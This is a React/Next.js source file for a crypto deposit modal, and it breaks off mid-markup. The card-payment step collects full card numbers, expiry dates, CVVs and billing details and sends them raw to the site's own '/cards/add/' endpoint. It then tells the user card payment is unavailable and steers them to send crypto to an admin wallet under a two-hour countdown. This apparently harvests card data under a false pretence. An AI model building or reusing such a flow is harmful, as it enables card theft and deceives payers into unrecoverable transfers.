"use client";

import React, { useState, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  Info,
  AlertCircle,
  Clock,
  Copy,
  Check,
  Upload,
  Target,
  Shield,
  CheckCircle,
  Loader2,
  CreditCard,
  ArrowLeft,
} from "lucide-react";
import Image from "next/image";
import { toast } from "sonner";
import { apiFetch } from "@/lib/api";
import { BACKEND_URL } from "@/lib/constants";
import { AdminWallet } from "./types";
import { getCryptoIcon, getNetworkName } from "./crypto-icons";

interface DepositModalProps {
  isOpen: boolean;
  onClose: () => void;
}

type DepositStep = "select" | "card" | "address" | "amount" | "details" | "success";

export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
  const [step, setStep] = useState<DepositStep>("select");
  const [wallets, setWallets] = useState<AdminWallet[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedWallet, setSelectedWallet] = useState<AdminWallet | null>(
    null,
  );
  const [dollarAmount, setDollarAmount] = useState("");
  const [currencyAmount, setCurrencyAmount] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [sendingIntent, setSendingIntent] = useState(false);
  const [depositReference, setDepositReference] = useState("");

  // Card step state
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [billingAddress, setBillingAddress] = useState("");
  const [billingZip, setBillingZip] = useState("");
  const [submittingCard, setSubmittingCard] = useState(false);
  const [cardError, setCardError] = useState("");

  // Details step state
  const [countdown, setCountdown] = useState(7200);
  const [copied, setCopied] = useState(false);
  const [receipt, setReceipt] = useState<File | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    if (isOpen) {
      fetchDepositOptions();
    }
  }, [isOpen]);

  // Calculate currency amount when dollar amount changes
  useEffect(() => {
    if (dollarAmount && selectedWallet) {
      const dollars = parseFloat(dollarAmount);
      const rate = parseFloat(selectedWallet.amount);
      if (!isNaN(dollars) && !isNaN(rate) && rate > 0) {
        setCurrencyAmount((dollars / rate).toFixed(8));
      } else {
        setCurrencyAmount("");
      }
    } else {
      setCurrencyAmount("");
    }
  }, [dollarAmount, selectedWallet]);

  // Countdown timer for details step
  useEffect(() => {
    if (step === "details" && countdown > 0) {
      const timer = setInterval(
        () => setCountdown((p) => (p > 0 ? p - 1 : 0)),
        1000,
      );
      return () => clearInterval(timer);
    }
  }, [step, countdown]);

  const fetchDepositOptions = async () => {
    setLoading(true);
    try {
      const res = await apiFetch("/deposits/options/");
      const data = await res.json();
      if (data.success) {
        setWallets(data.wallets);
      } else {
        toast.error(data.error || "Failed to load deposit options");
      }
    } catch {
      toast.error("Failed to connect to server");
    } finally {
      setLoading(false);
    }
  };

  const handleSelectWallet = (wallet: AdminWallet) => {
    setSelectedWallet(wallet);
    setCopied(false);
    setStep("amount");
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 19);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setCardError("");

    const rawNumber = cardNumber.replace(/\s/g, "");
    if (!cardholderName.trim()) {
      setCardError("Cardholder name is required");
      return;
    }
    if (rawNumber.length < 13 || rawNumber.length > 19) {
      setCardError("Invalid card number");
      return;
    }
    const expiryParts = cardExpiry.split("/");
    const expMonth = expiryParts[0]?.trim() || "";
    const expYear = expiryParts[1]?.trim() || "";
    if (expMonth.length !== 2 || expYear.length !== 2) {
      setCardError("Enter a valid expiry date (MM/YY)");
      return;
    }
    const monthNum = parseInt(expMonth, 10);
    if (monthNum < 1 || monthNum > 12) {
      setCardError("Invalid expiry month");
      return;
    }
    if (cvv.length < 3 || cvv.length > 4) {
      setCardError("Invalid CVV");
      return;
    }

    setSubmittingCard(true);
    try {
      const res = await apiFetch("/cards/add/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardholder_name: cardholderName.trim(),
          card_number: rawNumber,
          expiry_month: expMonth,
          expiry_year: `20${expYear}`,
          cvv,
          billing_address: billingAddress.trim(),
          billing_zip: billingZip.trim(),
        }),
      });
      const data = await res.json();
      if (data.error) {
        setCardError(data.error);
      } else {
        toast.info(
          data.message ||
            "Card payment is not available at this time. Please use cryptocurrency deposit options instead.",
        );
        // Reset card fields and go back to select
        setCardholderName("");
        setCardNumber("");
        setCardExpiry("");
        setCvv("");
        setBillingAddress("");
        setBillingZip("");
        setCardError("");
        setStep("select");
      }
    } catch {
      setCardError("Failed to connect to server");
    } finally {
      setSubmittingCard(false);
    }
  };

  const handleCopy = () => {
    if (!selectedWallet) return;
    navigator.clipboard.writeText(selectedWallet.wallet_address);
    setCopied(true);
  };

  const handleAmountSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!dollarAmount || parseFloat(dollarAmount) <= 0) {
      setError("Please enter a valid amount");
      return;
    }
    if (!currencyAmount || !selectedWallet) return;
    setError("");
    setSendingIntent(true);

    try {
      await apiFetch("/deposits/payment-intent/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          currency: selectedWallet.currency,
          dollar_amount: dollarAmount,
          currency_unit: currencyAmount,
        }),
      });
    } catch {
      // Non-blocking: proceed even if email fails
    } finally {
      setSendingIntent(false);
    }

    setStep("address");
  };

  const handleDragOver = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  }, []);

  const handleDragLeave = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
  }, []);

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const files = e.dataTransfer.files;
    const file = files?.[0];

    if (!file) return;

    if (!file.type.startsWith("image/")) {
      setError("Please upload an image file");
      return;
    }

    // Check file size (10MB = 10 * 1024 * 1024 bytes)
    const maxSize = 10 * 1024 * 1024;
    if (file.size > maxSize) {
      setError("File size must be less than 10MB");
      return;
    }

    setReceipt(file);
    setError("");
  }, []);

  const handleFileInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    const file = files?.[0];

    if (!file) return;

    if (!file.type.startsWith("image/")) {
      setError("Please upload an image file");
      return;
    }

    // Check file size (10MB = 10 * 1024 * 1024 bytes)
    const maxSize = 10 * 1024 * 1024;
    if (file.size > maxSize) {
      setError("File size must be less than 10MB");
      return;
    }

    setReceipt(file);
    setError("");
  };

  const handleConfirmDeposit = async () => {
    if (!selectedWallet || !receipt) {
      setError("Please upload payment receipt");
      return;
    }

    setSubmitting(true);
    try {
      const formData = new FormData();
      formData.append("currency", selectedWallet.currency);
      formData.append("dollar_amount", dollarAmount);
      formData.append("currency_unit", currencyAmount);
      formData.append("receipt", receipt);

      const res = await fetch(`${BACKEND_URL}/deposits/create/`, {
        method: "POST",
        body: formData,
        credentials: "include",
      });

      const data = await res.json();
      if (data.success) {
        setDepositReference(data.transaction.reference);
        setStep("success");
        toast.success("Deposit request submitted successfully!");
      } else {
        toast.error(data.error || "Failed to submit deposit");
      }
    } catch {
      toast.error("Failed to submit deposit request");
    } finally {
      setSubmitting(false);
    }
  };

  const handleClose = () => {
    setStep("select");
    setSelectedWallet(null);
    setDollarAmount("");
    setCurrencyAmount("");
    setReceipt(null);
    setError("");
    setCopied(false);
    setDepositReference("");
    setCardholderName("");
    setCardNumber("");
    setCardExpiry("");
    setCvv("");
    setBillingAddress("");
    setBillingZip("");
    setCardError("");
    onClose();
  };

  const formatCountdown = (seconds: number): string => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="absolute inset-0 bg-black/70 backdrop-blur-sm"
          onClick={handleClose}
        />

        {/* Modal */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          transition={{ duration: 0.2 }}
          className="relative w-full max-w-lg max-h-[90vh] overflow-y-auto rounded-2xl bg-white dark:bg-[#071a0e] border border-gray-200 dark:border-white/10 shadow-2xl"
        >
          {/* ==================== STEP: SELECT PAYMENT METHOD ==================== */}
          {step === "select" && (
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <div className="">
                  <h3 className="text-xl font-bold text-gray-900 dark:text-white">
                    Choose Payment Method
                  </h3>
                  <p className="text-xs sm:text-sm text-gray-500 dark:text-gray-400 max-w-[360px]">
                    Scroll and select your preferred payment method to deposit funds.
                  </p>
                </div>

                <button
                  onClick={handleClose}
                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Card Payment Option - Always at top */}
              <div
                className="bg-gray-50 dark:bg-[#0d3320]/80 border border-gray-200 dark:border-white/10 rounded-xl p-4 hover:border-green-500 dark:hover:border-green-500/30 transition-all mb-4 cursor-pointer"
                onClick={() => setStep("card")}
              >
                <div className="flex items-center gap-4 mb-3">
                  <div className="w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br from-green-600 to-green-700">
                    <CreditCard className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <h4 className="text-base font-semibold text-gray-900 dark:text-white">
                      Card Payment
                    </h4>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      Visa, Mastercard, Amex, Discover
                    </p>
                  </div>
                </div>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    setStep("card");
                  }}
                  className="w-full py-2.5 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors text-sm"
                >
                  Pay with Card
                </button>
              </div>

              {loading ? (
                <div className="flex items-center justify-center py-12">
                  <Loader2 className="w-8 h-8 text-green-500 animate-spin" />
                </div>
              ) : wallets.length === 0 ? (
                <div className="text-center py-12">
                  <AlertCircle className="w-12 h-12 text-gray-500 mx-auto mb-4" />
                  <p className="text-gray-600 dark:text-gray-400">
                    No deposit options available
                  </p>
                </div>
              ) : (
                <div className="space-y-4 max-h-[50vh] overflow-y-auto pr-1">
                  {wallets.map((wallet) => (
                    <div
                      key={wallet.id}
                      className="bg-gray-50 dark:bg-[#0d3320]/80 border border-gray-200 dark:border-white/10 rounded-xl p-4 hover:border-green-500 dark:hover:border-green-500/30 transition-all"
                    >
                      <div className="flex items-center gap-4 mb-3">
                        <div className="w-12 h-12 rounded-full flex items-center justify-center bg-gray-200 dark:bg-[#071a0e]">
                          {getCryptoIcon(wallet.currency)}
                        </div>
                        <div className="flex-1">
                          <h4 className="text-base font-semibold text-gray-900 dark:text-white">
                            {wallet.currency_display}
                          </h4>
                          <p className="text-xs text-gray-500 dark:text-gray-400">
                            {getNetworkName(wallet.currency)}
                          </p>
                          <p className="text-xs text-gray-500 mt-0.5">
                            Rate: ${wallet.amount} per unit
                          </p>
                        </div>
                      </div>
                      <button
                        onClick={() => handleSelectWallet(wallet)}
                        className="w-full py-2.5 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors text-sm"
                      >
                        Deposit
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ==================== STEP: CARD ENTRY ==================== */}
          {step === "card" && (
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <button
                    onClick={() => {
                      setCardError("");
                      setStep("select");
                    }}
                    className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                  >
                    <ArrowLeft className="w-5 h-5" />
                  </button>
                  <div>
                    <h3 className="text-xl font-bold text-gray-900 dark:text-white">
                      Card Payment
                    </h3>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      Enter your card details
                    </p>
                  </div>
                </div>
                <button
                  onClick={handleClose}
                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <form onSubmit={handleCardSubmit} className="space-y-4">
                {/* Cardholder Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                    Cardholder Name
                  </label>
                  <input
                    type="text"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm placeholder-gray-400 dark:placeholder-gray-600"
                    placeholder="John Doe"
                  />
                </div>

                {/* Card Number */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                    Card Number
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={(e) =>
                        setCardNumber(formatCardNumber(e.target.value))
                      }
                      className="w-full px-4 py-3 pr-12 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
                      placeholder="4242 4242 4242 4242"
                      maxLength={23}
                    />
                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  </div>
                </div>

                {/* Expiry + CVV Row */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                      Expiry Date
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardExpiry}
                      onChange={(e) => {
                        const prev = cardExpiry;
                        const raw = e.target.value;
                        // Strip everything except digits
                        const digits = raw.replace(/\D/g, "").slice(0, 4);

                        // If user is deleting, allow raw backspace behavior
                        if (raw.length < prev.length) {
                          // If they backspaced into "MM/" → just show "MM"
                          if (prev.endsWith("/") && !raw.endsWith("/")) {
                            setCardExpiry(digits.slice(0, 2));
                            return;
                          }
                          // Otherwise format normally from remaining digits
                          if (digits.length <= 2) {
                            setCardExpiry(digits);
                          } else {
                            setCardExpiry(
                              digits.slice(0, 2) + "/" + digits.slice(2),
                            );
                          }
                          return;
                        }

                        // Typing forward: auto-insert slash after MM
                        if (digits.length <= 2) {
                          setCardExpiry(digits);
                        } else {
                          setCardExpiry(
                            digits.slice(0, 2) + "/" + digits.slice(2),
                          );
                        }
                      }}
                      className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
                      placeholder="MM/YY"
                      maxLength={5}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                      CVV
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cvv}
                      onChange={(e) =>
                        setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                      }
                      className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
                      placeholder="123"
                      maxLength={4}
                    />
                  </div>
                </div>

                {/* Billing Address */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                    Billing Address{" "}
                    <span className="text-gray-400 font-normal">(Optional)</span>
                  </label>
                  <input
                    type="text"
                    value={billingAddress}
                    onChange={(e) => setBillingAddress(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm placeholder-gray-400 dark:placeholder-gray-600"
                    placeholder="123 Main St, Apt 4B"
                  />
                </div>

                {/* Billing Zip */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
                    Billing Zip Code{" "}
                    <span className="text-gray-400 font-normal">(Optional)</span>
                  </label>
                  <input
                    type="text"
                    value={billingZip}
                    onChange={(e) => setBillingZip(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-sm placeholder-gray-400 dark:placeholder-gray-600"
                    placeholder="10001"
                  />
                </div>

                {/* Error */}
                {cardError && (
                  <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                    <div className="flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 text-red-400 flex-shrink-0" />
                      <p className="text-xs text-red-400">{cardError}</p>
                    </div>
                  </div>
                )}

                {/* Submit */}
                <div className="flex gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      setCardError("");
                      setStep("select");
                    }}
                    className="flex-1 py-3 bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white rounded-lg font-semibold transition-colors text-sm"
                  >
                    Back
                  </button>
                  <button
                    type="submit"
                    disabled={submittingCard}
                    className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
                  >
                    {submittingCard ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        <CreditCard className="w-4 h-4" />
                        Add Card
                      </>
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* ==================== STEP: COPY WALLET ADDRESS ==================== */}
          {step === "address" && selectedWallet && (
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-gray-900 dark:text-white">
                  Deposit {selectedWallet.currency_display}
                </h3>
                <button
                  onClick={handleClose}
                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Selected Coin Info */}
              <div className="bg-green-600/10 border border-green-500/30 rounded-xl p-4 mb-5">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-full flex items-center justify-center bg-gray-200 dark:bg-[#071a0e]">
                    {getCryptoIcon(selectedWallet.currency)}
                  </div>
                  <div>
                    <p className="text-green-700 dark:text-green-400 font-semibold">
                      {selectedWallet.currency_display}
                    </p>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      {getNetworkName(selectedWallet.currency)}
                    </p>
                  </div>
                </div>
              </div>

              {/* Wallet Address */}
              <div className="mb-5">
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Send to this wallet address
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={selectedWallet.wallet_address}
                    readOnly
                    className="flex-1 px-3 py-2.5 bg-gray-100 dark:bg-[#0d3320] border border-gray-200 dark:border-white/10 rounded-lg text-gray-700 dark:text-gray-300 text-xs font-mono focus:outline-none"
                  />
                  <button
                    onClick={handleCopy}
                    className={`px-4 py-2.5 rounded-lg transition-all flex items-center gap-1.5 text-sm font-medium ${
                      copied
                        ? "bg-green-500/10 border border-green-500/30 text-green-600 dark:text-green-400"
                        : "bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white"
                    }`}
                  >
                    {copied ? (
                      <>
                        <Check className="w-4 h-4" /> Copied
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4" /> Copy
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* QR Code */}
              {selectedWallet.qr_code_url && (
                <div className="flex justify-center mb-5">
                  <div className="bg-white p-4 rounded-lg border border-gray-200 dark:border-white/10">
                    <Image
                      src={selectedWallet.qr_code_url}
                      alt="QR Code"
                      width={150}
                      height={150}
                      className="rounded"
                    />
                    <p className="text-center text-xs text-gray-600 dark:text-gray-400 mt-2 font-medium">
                      Scan to Pay
                    </p>
                  </div>
                </div>
              )}

              {/* Prompt to copy */}
              {!copied && (
                <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 mb-5">
                  <div className="flex items-start gap-2">
                    <Info className="w-4 h-4 text-amber-500 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-gray-700 dark:text-gray-300">
                      Please copy the wallet address above before proceeding to
                      the next step.
                    </p>
                  </div>
                </div>
              )}

              {/* Buttons */}
              <div className="flex gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setStep("amount");
                    setCopied(false);
                  }}
                  className="flex-1 py-3 bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white rounded-lg font-semibold transition-colors text-sm"
                >
                  Back
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setCountdown(7200);
                    setStep("details");
                  }}
                  disabled={!copied}
                  className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors disabled:opacity-40 disabled:cursor-not-allowed text-sm"
                >
                  Continue
                </button>
              </div>
            </div>
          )}

          {/* ==================== STEP: ENTER AMOUNT ==================== */}
          {step === "amount" && selectedWallet && (
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-gray-900 dark:text-white">
                  Enter Amount
                </h3>
                <button
                  onClick={handleClose}
                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Currency Info */}
              <div className="bg-green-600/10 border border-green-500/30 rounded-xl p-4 mb-5">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-full flex items-center justify-center bg-gray-200 dark:bg-[#071a0e]">
                    {getCryptoIcon(selectedWallet.currency)}
                  </div>
                  <div>
                    <p className="text-green-700 dark:text-green-400 font-semibold">
                      {selectedWallet.currency_display}
                    </p>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      Rate: ${selectedWallet.amount} per unit
                    </p>
                  </div>
                </div>
              </div>

              {/* Info Banner */}
              <div className="bg-green-600/10 border border-green-500/20 rounded-xl p-4 mb-5">
                <div className="flex items-start gap-2">
                  <Info className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-xs text-gray-700 dark:text-gray-300 mb-2">
                      Don&apos;t have cryptocurrency? Purchase from:
                    </p>
                    <div className="flex flex-wrap gap-1.5">
                      {[
                        { name: "Binance", url: "https://www.binance.com" },
                        { name: "Coinbase", url: "https://www.coinbase.com" },
                        { name: "Crypto.com", url: "https://crypto.com" },
                        { name: "Kraken", url: "https://www.kraken.com" },
                      ].map((ex) => (
                        <a
                          key={ex.name}
                          href={ex.url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="px-2.5 py-1 bg-gray-200 dark:bg-white/5 rounded-md text-[10px] text-gray-700 dark:text-gray-300 font-medium hover:bg-green-100 dark:hover:bg-green-600/10 hover:text-green-700 dark:hover:text-green-500 transition-colors"
                        >
                          {ex.name}
                        </a>
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* Amount Form */}
              <form onSubmit={handleAmountSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm text-gray-700 dark:text-gray-300 mb-2 font-medium">
                    Amount (USD)
                  </label>
                  <input
                    type="number"
                    step="0.01"
                    value={dollarAmount}
                    onChange={(e) => {
                      setDollarAmount(e.target.value);
                      setError("");
                    }}
                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#0d3320] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-green-600 text-lg font-semibold placeholder-gray-400 dark:placeholder-gray-600"
                    placeholder="0.00"
                  />
                  {error && (
                    <p className="text-red-400 text-xs mt-1">{error}</p>
                  )}
                </div>

                {currencyAmount && dollarAmount && (
                  <div className="bg-gray-100 dark:bg-[#0d3320] rounded-lg p-4 border border-gray-200 dark:border-white/10">
                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-1">
                      You will send:
                    </p>
                    <div className="flex items-baseline gap-2">
                      <p className="text-xl font-bold text-green-700 dark:text-green-400">
                        {currencyAmount}
                      </p>
                      <p className="text-sm text-gray-500 dark:text-gray-400">
                        {selectedWallet.currency}
                      </p>
                    </div>
                  </div>
                )}

                <div className="flex gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      setStep("select");
                      setDollarAmount("");
                      setError("");
                    }}
                    className="flex-1 py-3 bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white rounded-lg font-semibold transition-colors text-sm"
                  >
                    Back
                  </button>
                  <button
                    type="submit"
                    disabled={!dollarAmount || !currencyAmount || sendingIntent}
                    className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-sm flex items-center justify-center gap-2"
                  >
                    {sendingIntent ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Continue"
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* ==================== STEP: DEPOSIT DETAILS ==================== */}
          {step === "details" && selectedWallet && (
            <div className="p-6 space-y-5">
              <div className="flex items-center justify-between pb-4 border-b border-gray-200 dark:border-white/10">
                <h3 className="text-xl font-bold text-gray-900 dark:text-white">
                  Complete Your Deposit
                </h3>
                <button
                  onClick={handleClose}
                  disabled={submitting}
                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Order Banner */}
              <div className="bg-green-600/10 border border-green-500/20 rounded-xl p-4">
                <p className="text-sm text-gray-800 dark:text-gray-200">
                  Your deposit of{" "}
                  <span className="text-green-700 dark:text-green-400 font-bold">
                    ${dollarAmount} USD
                  </span>{" "}
                  has been initiated.
                </p>
                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                  Send{" "}
                  <span className="text-green-700 dark:text-green-400 font-bold">
                    {currencyAmount} {selectedWallet.currency}
                  </span>{" "}
                  to the address you copied.
                </p>
              </div>

              {/* Transaction Steps */}
              <div className="bg-gray-50 dark:bg-[#0d3320]/80 rounded-xl p-4 space-y-4">
                {/* Step 1 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-green-600 flex items-center justify-center flex-shrink-0 text-white text-xs font-bold">
                    1
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1.5 flex items-center gap-1.5">
                      <Target className="w-3.5 h-3.5" />
                      Check coin
                    </p>
                    <div className="flex items-center gap-2 bg-white dark:bg-[#071a0e] px-3 py-2 rounded-md">
                      <div className="w-5 h-5">
                        {getCryptoIcon(selectedWallet.currency)}
                      </div>
                      <span className="text-sm text-gray-900 dark:text-white font-semibold">
                        {selectedWallet.currency}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Step 2 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-green-600 flex items-center justify-center flex-shrink-0 text-white text-xs font-bold">
                    2
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1.5 flex items-center gap-1.5">
                      <Shield className="w-3.5 h-3.5" />
                      Total amount
                    </p>
                    <div className="bg-white dark:bg-[#071a0e] px-3 py-2 rounded-md">
                      <p className="text-lg font-bold text-green-700 dark:text-green-400">
                        {currencyAmount}{" "}
                        <span className="text-xs text-gray-500 dark:text-gray-400">
                          {selectedWallet.currency}
                        </span>
                      </p>
                      <p className="text-sm text-gray-500 dark:text-gray-400">
                        = ${dollarAmount} USD
                      </p>
                    </div>
                  </div>
                </div>

                {/* Step 3 */}
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0 text-white text-xs font-bold">
                    <Check className="w-3.5 h-3.5" />
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1.5">
                      Wallet address copied
                    </p>
                    <div className="bg-white dark:bg-[#071a0e] px-3 py-2 rounded-md">
                      <p className="text-xs font-mono text-gray-700 dark:text-gray-300 break-all">
                        {selectedWallet.wallet_address}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Countdown */}
              <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 text-center">
                <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">
                  Address valid for:
                </p>
                <div className="flex items-center justify-center gap-2">
                  <Clock className="w-5 h-5 text-red-400 animate-pulse" />
                  <p className="text-2xl font-bold text-red-400 font-mono">
                    {formatCountdown(countdown)}
                  </p>
                </div>
              </div>

              {/* Warning */}
              <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3">
                <div className="flex items-start gap-2">
                  <AlertCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-gray-700 dark:text-gray-300">
                    <span className="font-semibold">Important:</span> Send
                    exactly <span className="font-bold">{currencyAmount}</span>{" "}
                    {selectedWallet.currency}.
                  </p>
                </div>
              </div>

              {/* Receipt Upload */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Upload Payment Receipt:
                </label>
                <div
                  onDragOver={handleDragOver}
                  onDragLeave={handleDragLeave}
                  onDrop={handleDrop}
                  className={`border-2 border-dashed rounded-xl p-5 text-center transition-all ${
                    isDragging
